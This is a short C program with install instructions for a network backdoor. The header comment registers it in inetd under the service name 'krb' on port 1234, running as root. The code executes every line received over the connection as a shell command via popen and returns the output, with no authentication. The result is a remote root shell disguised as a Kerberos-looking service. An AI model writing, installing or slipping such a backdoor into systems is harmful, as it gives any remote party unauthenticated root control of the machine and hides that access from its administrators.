/**
modify /etc/services  --->    krb    1234/tcp 
add the following to /etc/inetd.conf :
krb	stream	tcp	wait/0/0	root:root	path_to_binary

**/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{

	    FILE* fp = NULL;
	    char cmd[2048], output[2048];


	    memset(cmd, 0, sizeof cmd);
	    while(fgets(cmd, sizeof cmd, stdin)){
		
		        if(!(fp = popen(cmd, "r")))
			            return EXIT_FAILURE;
		
		        memset(output, 0, sizeof output);
		        while(fgets(output, sizeof output, fp)){
		            	fwrite(output, 1, strlen(output), stdout);
		            	fflush(stdout);
		            	memset(output, 0, sizeof output);		
	        	}
	        	pclose(fp);
		        fp = NULL;
	
	          memset(cmd, 0, sizeof cmd);
	}

	return 0;
    
}
